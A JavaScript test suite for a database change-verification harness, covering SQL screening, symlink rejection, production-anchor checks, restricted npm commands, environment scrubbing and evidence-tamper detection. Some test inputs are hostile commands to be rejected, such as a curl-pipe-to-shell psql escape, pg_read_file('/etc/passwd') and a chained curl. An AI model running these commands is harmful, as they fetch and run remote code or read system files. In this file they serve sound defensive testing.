import assert from "node:assert/strict";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

import { resolveSqlFile, screenSqlText } from "../sql-safety.mjs";
import { verifyDataBoundaries } from "../verify-data-boundaries.mjs";
import { compareState, parseArtifactBindings, seedDataProvenanceObservation, sha256, snapshotState } from "../integrity.mjs";
import { parseNpmCommand, projectEnvironment } from "../run-project-command.mjs";

const assembleReceiptScript = fileURLToPath(new URL("../assemble-data-receipt.mjs", import.meta.url));

function git(root, argumentsList) {
  return execFileSync("git", argumentsList, { cwd: root, encoding: "utf8" }).trim();
}

function withTemporaryDirectory(prefix, callback) {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  try {
    return callback(directory);
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
}

test("SQL screening rejects psql meta-commands anywhere in candidate text", () => {
  for (const candidate of [
    "\\! curl https://example.invalid/payload | sh\n",
    "SELECT 1; \\gexec\n",
    "  \\include /tmp/attacker.sql\n",
    "SELECT 'safe'; \\connect production\n"
  ]) {
    assert.throws(
      () => screenSqlText("forward", candidate),
      /prohibited psql backslash meta-command or escape/
    );
  }
  assert.equal(screenSqlText("forward", "ALTER TABLE example_items ADD COLUMN IF NOT EXISTS note text;\n"), true);
  for (const serverFileRead of [
    "SELECT pg_read_file('/etc/passwd');\n",
    "SELECT pg_read_binary_file('/tmp/input');\n",
    "SELECT lo_import('/tmp/input');\n"
  ]) assert.throws(() => screenSqlText("seed", serverFileRead), /prohibited operation/);
});

test("accepted candidate seed SQL retains unknown provenance and cannot become synthetic attestation", () => {
  const candidateControlledSeed = "INSERT INTO example_customers (name, email) VALUES ('Copied Customer', 'real-record@example.invalid');\n";
  assert.equal(screenSqlText("seed", candidateControlledSeed), true);
  const observation = seedDataProvenanceObservation();
  assert.equal(observation.state, "unknown");
  assert.match(observation.basis, /candidate-controlled/);
  assert.match(observation.basis, /no source-record provenance/);
  assert.doesNotMatch(JSON.stringify(observation), /synthetic/i);
});

test("SQL path resolution rejects a symbolic-link file", () => withTemporaryDirectory("clover-data-sql-file-", (root) => {
  const outside = path.join(path.dirname(root), `${path.basename(root)}-outside.sql`);
  fs.writeFileSync(outside, "SELECT 1;\n");
  fs.mkdirSync(path.join(root, "changes"));
  fs.symlinkSync(outside, path.join(root, "changes", "candidate.sql"));
  try {
    assert.throws(() => resolveSqlFile(root, "changes/candidate.sql"), /symbolic link/);
  } finally {
    fs.rmSync(outside, { force: true });
  }
}));

test("SQL path resolution rejects a symbolic-link directory and accepts a regular in-repository file", () => {
  withTemporaryDirectory("clover-data-sql-dir-", (root) => {
    const inside = path.join(root, "inside");
    const real = path.join(inside, "real");
    fs.mkdirSync(real, { recursive: true });
    fs.writeFileSync(path.join(real, "candidate.sql"), "SELECT 1;\n");
    assert.equal(resolveSqlFile(root, "inside/real/candidate.sql"), fs.realpathSync(path.join(real, "candidate.sql")));
    fs.symlinkSync(real, path.join(inside, "linked"));
    assert.throws(() => resolveSqlFile(root, "inside/linked/candidate.sql"), /symbolic link/);
  });
});

test("boundary verification fails closed when origin production advances after enrollment", () => {
  withTemporaryDirectory("clover-data-anchor-", (root) => {
    git(root, ["init", "-b", "main"]);
    git(root, ["config", "user.email", "clover-tests@example.invalid"]);
    git(root, ["config", "user.name", "Clover Tests"]);
    fs.writeFileSync(path.join(root, "seed.txt"), "baseline\n");
    git(root, ["add", "seed.txt"]);
    git(root, ["commit", "-m", "baseline"]);
    const enrollmentCommit = git(root, ["rev-parse", "HEAD"]);
    git(root, ["branch", "chatpro/candidate"]);

    fs.writeFileSync(path.join(root, "production.txt"), "advanced\n");
    git(root, ["add", "production.txt"]);
    git(root, ["commit", "-m", "advance production"]);
    const observedProductionCommit = git(root, ["rev-parse", "HEAD"]);
    git(root, ["update-ref", "refs/remotes/origin/main", observedProductionCommit]);

    git(root, ["checkout", "chatpro/candidate"]);
    fs.mkdirSync(path.join(root, "changes"));
    fs.writeFileSync(path.join(root, "changes", "candidate.sql"), "SELECT 1;\n");
    git(root, ["add", "changes/candidate.sql"]);
    git(root, ["commit", "-m", "candidate"]);

    const protocolCommit = "a".repeat(40);
    const policy = {
      protocol: { version: "1.0.1", repository: "chrisdortch/first", commit: protocolCommit },
      project: { repository: "owner/repository", productionBranch: "main" },
      source: { baselineCommit: enrollmentCommit, productionCommitAtEnrollment: enrollmentCommit },
      execution: {
        mode: "disposable-database-only",
        requireProductionAnchorUnchanged: true,
        allowedBranchPrefixes: ["chatpro/"],
        allowedChangePaths: ["changes/**"],
        sensitivePaths: ["sensitive/**"],
        forbiddenEnvironmentVariables: ["DATABASE_URL"]
      },
      authority: { productionDatabaseReadApproved: false, productionDatabaseWriteApproved: false }
    };
    const environment = {
      GITHUB_REF_NAME: "chatpro/candidate",
      GITHUB_REPOSITORY: "owner/repository",
      CLOVER_PROTOCOL_REF: protocolCommit,
      CLOVER_CANDIDATE_REF: git(root, ["rev-parse", "HEAD"])
    };

    const stale = verifyDataBoundaries({ root, policy, environment });
    assert.equal(stale.status, "failed");
    assert.equal(stale.checks.productionAnchorUnchanged, false);
    assert.equal(stale.productionCommitObserved, observedProductionCommit);
    assert.match(stale.failures.join("\n"), /Production anchor changed/);

    git(root, ["checkout", "main"]);
    git(root, ["checkout", "-b", "chatpro/current"]);
    fs.mkdirSync(path.join(root, "changes"));
    fs.writeFileSync(path.join(root, "changes", "candidate.sql"), "SELECT 2;\n");
    git(root, ["add", "changes/candidate.sql"]);
    git(root, ["commit", "-m", "current candidate"]);

    const current = verifyDataBoundaries({
      root,
      policy: {
        ...policy,
        source: {
          baselineCommit: observedProductionCommit,
          productionCommitAtEnrollment: observedProductionCommit
        }
      },
      environment: {
        ...environment,
        GITHUB_REF_NAME: "chatpro/current",
        CLOVER_CANDIDATE_REF: git(root, ["rev-parse", "HEAD"])
      }
    });
    assert.equal(current.status, "passed");
    assert.equal(current.checks.productionAnchorUnchanged, true);
    assert.equal(current.checks.candidateBasedOnProduction, true);
    assert.equal(current.checks.protocolCommitBound, true);
    assert.equal(current.protocolCommitObserved, protocolCommit);
    assert.deepEqual(current.safety, {
      productionDatabaseConnectionAccepted: false,
      productionDataReadAuthorized: false,
      productionDataWriteAuthorized: false
    });
  });
});

test("boundary verification binds the policy to the exact observed protocol checkout", () => {
  withTemporaryDirectory("clover-data-protocol-bind-", (root) => {
    git(root, ["init", "-b", "main"]);
    git(root, ["config", "user.email", "clover-tests@example.invalid"]);
    git(root, ["config", "user.name", "Clover Tests"]);
    fs.writeFileSync(path.join(root, "seed.txt"), "baseline\n");
    git(root, ["add", "seed.txt"]);
    git(root, ["commit", "-m", "baseline"]);
    const baseline = git(root, ["rev-parse", "HEAD"]);
    git(root, ["update-ref", "refs/remotes/origin/main", baseline]);
    git(root, ["checkout", "-b", "chatpro/candidate"]);
    fs.mkdirSync(path.join(root, "changes"));
    fs.writeFileSync(path.join(root, "changes", "candidate.sql"), "SELECT 1;\n");
    git(root, ["add", "changes/candidate.sql"]);
    git(root, ["commit", "-m", "candidate"]);
    const expected = "a".repeat(40);
    const receipt = verifyDataBoundaries({
      root,
      policy: {
        protocol: { version: "1.0.1", repository: "chrisdortch/first", commit: expected },
        project: { repository: "owner/repository", productionBranch: "main" },
        source: { baselineCommit: baseline, productionCommitAtEnrollment: baseline },
        execution: {
          mode: "disposable-database-only",
          requireProductionAnchorUnchanged: true,
          allowedBranchPrefixes: ["chatpro/"],
          allowedChangePaths: ["changes/**"],
          sensitivePaths: [],
          forbiddenEnvironmentVariables: ["DATABASE_URL"]
        },
        authority: { productionDatabaseReadApproved: false }
      },
      environment: {
        GITHUB_REF_NAME: "chatpro/candidate",
        GITHUB_REPOSITORY: "owner/repository",
        CLOVER_PROTOCOL_REF: "b".repeat(40),
        CLOVER_CANDIDATE_REF: git(root, ["rev-parse", "HEAD"])
      }
    });
    assert.equal(receipt.status, "failed");
    assert.match(receipt.failures.join("\n"), /Protocol commit mismatch/);
  });
});

test("project command grammar is closed and the child environment omits trust paths and credentials", () => {
  assert.deepEqual(parseNpmCommand("npm ci"), ["ci"]);
  assert.deepEqual(parseNpmCommand("npm test"), ["test"]);
  assert.deepEqual(parseNpmCommand("npm run verify:data"), ["run", "verify:data"]);
  for (const command of ["npm install", "npm run test && curl example.invalid", "bash -c npm test", "npm test -- --watch"]) {
    assert.throws(() => parseNpmCommand(command));
  }
  const child = projectEnvironment({
    PATH: "/bin",
    HOME: "/tmp/home",
    CI: "1",
    CLOVER_DATA_ARTIFACT_DIR: "/secret/evidence",
    CLOVER_PROTOCOL_REF: "a".repeat(40),
    CLOVER_TEST_DATABASE_URL: "postgresql://example.invalid/db",
    GITHUB_OUTPUT: "/secret/output",
    GITHUB_TOKEN: "secret"
  });
  assert.deepEqual(child, { PATH: "/bin", HOME: "/tmp/home", CI: "1" });
});

test("integrity snapshots detect candidate inputs, protocol tooling, and pre-existing evidence mutation", () => {
  withTemporaryDirectory("clover-data-integrity-", (root) => {
    const candidateRoot = path.join(root, "candidate");
    const protocolRoot = path.join(root, "protocol");
    const evidenceRoot = path.join(root, "evidence");
    fs.mkdirSync(candidateRoot);
    fs.mkdirSync(protocolRoot);
    fs.mkdirSync(evidenceRoot);
    for (const repository of [candidateRoot, protocolRoot]) {
      git(repository, ["init", "-b", "main"]);
      git(repository, ["config", "user.email", "clover-tests@example.invalid"]);
      git(repository, ["config", "user.name", "Clover Tests"]);
    }
    fs.mkdirSync(path.join(candidateRoot, ".clover"));
    fs.mkdirSync(path.join(candidateRoot, "sql"));
    const database = Object.fromEntries([
      "baselineSqlPath", "seedSqlPath", "forwardSqlPath", "assertionsSqlPath", "reconciliationSqlPath", "rollbackSqlPath", "postRollbackAssertionsSqlPath"
    ].map((name) => [name, `sql/${name}.sql`]));
    for (const relative of Object.values(database)) fs.writeFileSync(path.join(candidateRoot, relative), "SELECT 1;\n");
    const policyPath = path.join(candidateRoot, ".clover", "data-change-policy.json");
    fs.writeFileSync(policyPath, `${JSON.stringify({ database })}\n`);
    git(candidateRoot, ["add", "."]);
    git(candidateRoot, ["commit", "-m", "candidate"]);
    fs.writeFileSync(path.join(protocolRoot, "runtime.mjs"), "export const trusted = true;\n");
    git(protocolRoot, ["add", "."]);
    git(protocolRoot, ["commit", "-m", "protocol"]);
    fs.mkdirSync(path.join(protocolRoot, "node_modules", "tool"), { recursive: true });
    const tool = path.join(protocolRoot, "node_modules", "tool", "index.js");
    fs.writeFileSync(tool, "trusted\n");
    fs.writeFileSync(path.join(evidenceRoot, "boundary.json"), "{\"status\":\"passed\"}\n");
    const candidate = git(candidateRoot, ["rev-parse", "HEAD"]);
    const protocol = git(protocolRoot, ["rev-parse", "HEAD"]);
    const capture = () => snapshotState({
      candidateRoot,
      protocolRoot,
      expectedCandidate: candidate,
      expectedProtocol: protocol,
      policyPath,
      evidenceRoot
    });
    const before = capture();

    fs.writeFileSync(path.join(candidateRoot, "sql", "forwardSqlPath.sql"), "SELECT 2;\n");
    let comparison = compareState(before, capture());
    assert.equal(comparison.status, "failed");
    assert.equal(comparison.observations.inputMutation, "observed");
    fs.writeFileSync(path.join(candidateRoot, "sql", "forwardSqlPath.sql"), "SELECT 1;\n");

    fs.writeFileSync(tool, "tampered\n");
    comparison = compareState(before, capture());
    assert.equal(comparison.status, "failed");
    assert.equal(comparison.observations.protocolMutation, "observed");
    fs.writeFileSync(tool, "trusted\n");

    fs.writeFileSync(path.join(evidenceRoot, "boundary.json"), "{\"status\":\"forged\"}\n");
    comparison = compareState(before, capture());
    assert.equal(comparison.status, "failed");
    assert.equal(comparison.observations.preExistingEvidenceMutation, "observed");
  });
});

test("integrity artifact bindings reject forged command evidence and unexpected additions", () => {
  withTemporaryDirectory("clover-data-artifact-bind-", (root) => {
    const candidateRoot = path.join(root, "candidate");
    const protocolRoot = path.join(root, "protocol");
    const evidenceRoot = path.join(root, "evidence");
    fs.mkdirSync(candidateRoot);
    fs.mkdirSync(protocolRoot);
    fs.mkdirSync(evidenceRoot);
    for (const repository of [candidateRoot, protocolRoot]) {
      git(repository, ["init", "-b", "main"]);
      git(repository, ["config", "user.email", "clover-tests@example.invalid"]);
      git(repository, ["config", "user.name", "Clover Tests"]);
    }
    fs.mkdirSync(path.join(candidateRoot, ".clover"));
    fs.mkdirSync(path.join(candidateRoot, "sql"));
    const database = Object.fromEntries([
      "baselineSqlPath", "seedSqlPath", "forwardSqlPath", "assertionsSqlPath", "reconciliationSqlPath", "rollbackSqlPath", "postRollbackAssertionsSqlPath"
    ].map((name) => [name, `sql/${name}.sql`]));
    for (const relative of Object.values(database)) fs.writeFileSync(path.join(candidateRoot, relative), "SELECT 1;\n");
    const policyPath = path.join(candidateRoot, ".clover", "data-change-policy.json");
    fs.writeFileSync(policyPath, `${JSON.stringify({ database })}\n`);
    git(candidateRoot, ["add", "."]);
    git(candidateRoot, ["commit", "-m", "candidate"]);
    fs.writeFileSync(path.join(protocolRoot, "runtime.mjs"), "trusted\n");
    git(protocolRoot, ["add", "."]);
    git(protocolRoot, ["commit", "-m", "protocol"]);
    fs.mkdirSync(path.join(protocolRoot, "node_modules", "tool"), { recursive: true });
    fs.writeFileSync(path.join(protocolRoot, "node_modules", "tool", "index.js"), "trusted\n");
    const candidate = git(candidateRoot, ["rev-parse", "HEAD"]);
    const protocol = git(protocolRoot, ["rev-parse", "HEAD"]);
    const capture = () => snapshotState({ candidateRoot, protocolRoot, expectedCandidate: candidate, expectedProtocol: protocol, policyPath, evidenceRoot });
    const before = capture();
    fs.mkdirSync(path.join(evidenceRoot, "commands"));
    fs.writeFileSync(path.join(evidenceRoot, "commands", "install.json"), "forged\n");
    fs.writeFileSync(path.join(evidenceRoot, "unexpected.json"), "forged\n");
    const comparison = compareState(before, capture(), {
      allowedArtifacts: new Map([["commands/install.json", sha256("trusted\n")]])
    });
    assert.equal(comparison.status, "failed");
    assert.match(comparison.failures.join("\n"), /Evidence hash mismatch/);
    assert.match(comparison.failures.join("\n"), /Unexpected evidence addition/);
  });
});

test("descendant evidence patterns allow only normalized descendants, not sibling or prefix-confusion paths", () => {
  const commit = "a".repeat(40);
  const tree = "b".repeat(40);
  const clean = sha256(Buffer.alloc(0));
  const candidate = {
    commit,
    tree,
    entryCount: 1,
    entriesSha256: "c".repeat(64),
    statusSha256: clean,
    statusBase64: "",
    expectedCommit: commit,
    exactCommit: true,
    trackedClean: true
  };
  const protocol = {
    ...candidate,
    tooling: { present: true, entryCount: 1, treeSha256: "d".repeat(64) }
  };
  const state = (paths) => ({
    candidate,
    protocol,
    inputs: [],
    evidence: {
      entries: paths.map((relative) => ({ path: relative, type: "file", mode: 33188, bytes: 1, sha256: "e".repeat(64) }))
    }
  });
  const before = state([]);
  const { allowedArtifacts, allowedPrefixes } = parseArtifactBindings(["database/**"]);
  assert.deepEqual(allowedPrefixes, ["database/"]);
  assert.equal(compareState(before, state(["database/logs/x.log"]), { allowedArtifacts, allowedPrefixes }).status, "passed");
  for (const escaped of ["database-escape/x.log", "databaseevil/x.log", "database"] ) {
    const comparison = compareState(before, state([escaped]), { allowedArtifacts, allowedPrefixes });
    assert.equal(comparison.status, "failed");
    assert.match(comparison.failures.join("\n"), /Unexpected evidence addition/);
  }
  for (const malformed of ["/database/**", "database/../escape/**", "database/*/logs/**", "database/**/x"]) {
    assert.throws(() => parseArtifactBindings([malformed]));
  }
});

test("final receipt rejects source substitution and any artifact changed after its step output", () => {
  withTemporaryDirectory("clover-data-receipt-", (root) => {
    const artifacts = path.join(root, "evidence");
    const baseline = "a".repeat(40);
    const candidate = "c".repeat(40);
    const protocol = "d".repeat(40);
    const policy = {
      project: { id: "example", title: "Example", repository: "owner/repository", class: "database-backed" },
      source: { baselineCommit: baseline, productionCommitAtEnrollment: baseline },
      protocol: { version: "1.0.1", repository: "chrisdortch/first", commit: protocol }
    };
    const boundary = {
      status: "passed",
      repository: policy.project.repository,
      baselineCommit: baseline,
      productionCommitAtEnrollment: baseline,
      productionCommitObserved: baseline,
      candidateCommitExpected: candidate,
      candidateCommit: candidate,
      branch: "chatpro/candidate",
      protocolCommitObserved: protocol,
      changedFiles: ["changes/candidate.sql"],
      checks: { productionAnchorUnchanged: true, candidateBasedOnProduction: true, protocolCommitBound: true }
    };
    const rehearsalChecks = Object.fromEntries([
      "connectionBoundary", "sqlPathIntegrity", "psqlMetaCommandsRejected", "sqlScreening", "baseline", "forward", "forwardIdempotency", "rollback", "schemaRestored", "reconciliationPreserved", "namespace"
    ].map((name) => [name, "passed"]));
    const values = {
      "policy-schema.json": { status: "passed" },
      "boundary.json": boundary,
      "integrity/pre-install.json": { status: "passed" },
      "commands/install.json": { status: "passed" },
      "commands/install.log": "install log\n",
      "integrity/after-install.json": { status: "passed", observations: { candidateMutation: "not-observed" } },
      "integrity/pre-verify.json": { status: "passed" },
      "commands/verify.json": { status: "passed" },
      "commands/verify.log": "verify log\n",
      "integrity/after-verify.json": { status: "passed", observations: { candidateMutation: "not-observed" } },
      "integrity/pre-rehearsal.json": { status: "passed" },
      "database/database-rehearsal.json": {
        status: "passed",
        database: { mode: "disposable-database-only", engine: "postgresql", majorVersion: 16, hostClass: "local-ci-service", databaseName: "clover_data" },
        checks: rehearsalChecks,
        stages: {},
        sqlArtifacts: {}
      },
      "integrity/after-rehearsal.json": { status: "passed", observations: { inputMutation: "not-observed" } }
    };
    const environmentNames = {
      "policy-schema.json": "CLOVER_EXPECTED_POLICY_SCHEMA_SHA",
      "boundary.json": "CLOVER_EXPECTED_BOUNDARY_SHA",
      "integrity/pre-install.json": "CLOVER_EXPECTED_PRE_INSTALL_SHA",
      "commands/install.json": "CLOVER_EXPECTED_INSTALL_RECEIPT_SHA",
      "commands/install.log": "CLOVER_EXPECTED_INSTALL_LOG_SHA",
      "integrity/after-install.json": "CLOVER_EXPECTED_AFTER_INSTALL_SHA",
      "integrity/pre-verify.json": "CLOVER_EXPECTED_PRE_VERIFY_SHA",
      "commands/verify.json": "CLOVER_EXPECTED_VERIFY_RECEIPT_SHA",
      "commands/verify.log": "CLOVER_EXPECTED_VERIFY_LOG_SHA",
      "integrity/after-verify.json": "CLOVER_EXPECTED_AFTER_VERIFY_SHA",
      "integrity/pre-rehearsal.json": "CLOVER_EXPECTED_PRE_REHEARSAL_SHA",
      "database/database-rehearsal.json": "CLOVER_EXPECTED_REHEARSAL_SHA",
      "integrity/after-rehearsal.json": "CLOVER_EXPECTED_AFTER_REHEARSAL_SHA"
    };
    const writeArtifact = (relativePath, value) => {
      const target = path.join(artifacts, relativePath);
      fs.mkdirSync(path.dirname(target), { recursive: true });
      const bytes = typeof value === "string" ? value : `${JSON.stringify(value)}\n`;
      fs.writeFileSync(target, bytes);
      return sha256(bytes);
    };
    const environment = {
      ...process.env,
      CLOVER_CANDIDATE_REF: candidate,
      CLOVER_PROTOCOL_REF: protocol
    };
    for (const [relative, value] of Object.entries(values)) environment[environmentNames[relative]] = writeArtifact(relative, value);
    for (const name of [
      "IDENTITY", "TOOLING", "HARDENING", "POLICY_SCHEMA", "BOUNDARY", "PRE_INSTALL", "INSTALL", "CONTROL_AFTER_INSTALL", "INSTALL_INTEGRITY", "RESTORE_AFTER_INSTALL", "TOOLING_AFTER_INSTALL", "PRE_VERIFY", "VERIFY", "CONTROL_AFTER_VERIFY", "VERIFY_INTEGRITY", "RESTORE_AFTER_VERIFY", "TOOLING_AFTER_VERIFY", "PRE_REHEARSAL", "POSTGRES_CLIENT", "POSTGRES_READY", "REHEARSAL", "CONTROL_AFTER_REHEARSAL", "REHEARSAL_INTEGRITY", "RESTORE_AFTER_REHEARSAL", "TOOLING_AFTER_REHEARSAL", "FINAL_CONTROL"
    ]) environment[`CLOVER_OUTCOME_${name}`] = "success";
    const policyPath = path.join(root, "policy.json");
    fs.writeFileSync(policyPath, `${JSON.stringify(policy)}\n`);
    const assemble = (overrides = {}) => spawnSync(process.execPath, [assembleReceiptScript, policyPath, artifacts], {
      cwd: root,
      encoding: "utf8",
      env: { ...environment, ...overrides }
    });

    let result = assemble({ CLOVER_CANDIDATE_REF: "f".repeat(40) });
    assert.equal(result.status, 1);
    let receipt = JSON.parse(fs.readFileSync(path.join(artifacts, "data-change-receipt.json"), "utf8"));
    assert.equal(receipt.checks.sourceBindings, "failed");

    result = assemble();
    assert.equal(result.status, 0, result.stderr);
    receipt = JSON.parse(fs.readFileSync(path.join(artifacts, "data-change-receipt.json"), "utf8"));
    assert.equal(receipt.status, "passed");
    assert.equal(receipt.observations.projectCommandExternalEffects.state, "unknown");
    assert.equal(receipt.observations.seedDataProvenance.state, "unknown");
    assert.equal(receipt.safety.productionCredentialsSuppliedByWorkflow, false);
    assert.equal(Object.hasOwn(receipt.safety, "productionDataRead"), false);
    assert.equal(Object.hasOwn(receipt.safety, "trustedRehearsalSyntheticSeedOnly"), false);

    fs.writeFileSync(path.join(artifacts, "commands", "install.json"), "{\"status\":\"forged\"}\n");
    result = assemble();
    assert.equal(result.status, 1);
    receipt = JSON.parse(fs.readFileSync(path.join(artifacts, "data-change-receipt.json"), "utf8"));
    assert.equal(receipt.checks.evidenceBindings, "failed");
  });
});
